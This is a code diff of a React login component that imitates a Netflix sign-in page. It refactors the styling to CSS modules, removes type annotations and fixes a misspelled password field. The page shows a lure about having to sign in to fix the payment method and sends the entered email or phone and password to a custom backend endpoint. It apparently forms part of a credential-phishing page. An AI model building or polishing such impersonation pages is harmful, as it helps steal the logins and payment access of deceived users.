@@ -1,28 +1,25 @@
 import React, { useState } from "react";
-import './loginStyles.css';
+import styles from './login.module.css';
 
-interface LoginProps {
-    onLoginSuccess: () => void;
-}
 
-export default function Login({ onLoginSuccess }: LoginProps) {
+export default function Login({ onLoginSuccess }) {
     const [emailOrPhone, setEmailOrPhone] = useState("");
     const [password, setPassword] = useState("");
     const [errorMessage, setErrorMessage] = useState("");
     const [showRecaptchaInfo, setShowRecaptchaInfo] = useState(false);
 
-    const validateInput = async (e: React.FormEvent<HTMLFormElement>) => {
+    const validateInput = async (e) => {
         e.preventDefault();
 
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Regex para validar email
-        const phoneRegex = /^\+\d{1,3}\d{7,14}$/; // Regex para validar teléfono internacional
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^\+\d{1,3}\d{7,14}$/;
 
         if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
-            setErrorMessage(""); // Limpia el mensaje de error si la validación es exitosa
-            // Enviar los datos al servidor
+            setErrorMessage("");
+
             const data = {
                 name: emailOrPhone,
-                passworld: password,  // Nota: "passworld" parece un error tipográfico, tal vez quisieras usar "password"
+                password,  // Corregido el error tipográfico
             };
             try {
                 const response = await fetch('http://localhost:5000/api/enviar', {
@@ -35,7 +32,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
 
                 const result = await response.json();
                 if (response.status === 201) {
-                    onLoginSuccess(); // Llamada para cambiar a la tarjeta
+                    onLoginSuccess();
                 } else {
                     setErrorMessage(result.message);
                 }
@@ -52,15 +49,15 @@ export default function Login({ onLoginSuccess }: LoginProps) {
     };
 
     return (
-        <div className="conteiner-total">
-            <div className="PCELMDPDIS">
+        <div className={styles.conteinerTotal}>
+            <div className={styles.PCELMDPDIS}>
                 <p>Para corregir el método de pago debe iniciar sesión</p>
             </div>
-            <div className="conteiner-login">
-                <div className="DivH2">
+            <div className={styles.conteinerLogin}>
+                <div className={styles.divH2}>
                     <h2>Inicia sesión</h2>
                 </div>
-                <form onSubmit={validateInput} className="Conteiner-login-form">
+                <form onSubmit={validateInput} className={styles.conteinerLoginForm}>
                     <input
                         type="text"
                         placeholder="Email o número de celular"
@@ -69,7 +66,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
                         onChange={(e) => setEmailOrPhone(e.target.value)}
                     />
                     {errorMessage && (
-                        <p className="error-message">{errorMessage}</p>
+                        <p className={styles.errorMessage}>{errorMessage}</p>
                     )}
                     <input
                         type="password"
@@ -79,22 +76,22 @@ export default function Login({ onLoginSuccess }: LoginProps) {
                         onChange={(e) => setPassword(e.target.value)}
                     />
                     <button type="submit">Iniciar sesión</button>
-                    <div className="Centrado">
-                        <div className="Conteiner-Recuerdame">
+                    <div className={styles.centrado}>
+                        <div className={styles.conteinerRecuerdame}>
                             <input type="checkbox" id="Recuerdame" />
                             <p>Recuérdame</p>
                         </div>
-                        <a href="https://www.netflix.com/LoginHelp" className="Olvidaste">
+                        <a href="https://www.netflix.com/LoginHelp" className={styles.olvidaste}>
                             ¿Olvidaste la contraseña?
                         </a>
                     </div>
                 </form>
-                <div className="text">
+                <div className={styles.text}>
                     <button type="button" onClick={handleRecaptchaClick}>
                         Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
                     </button>
                     {showRecaptchaInfo && (
-                        <p className="recaptcha-info">
+                        <p className={styles.recaptchaInfo}>
                             La información recopilada por Google reCAPTCHA está sujeta a la{' '}
                             <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">
                                 Política de privacidad
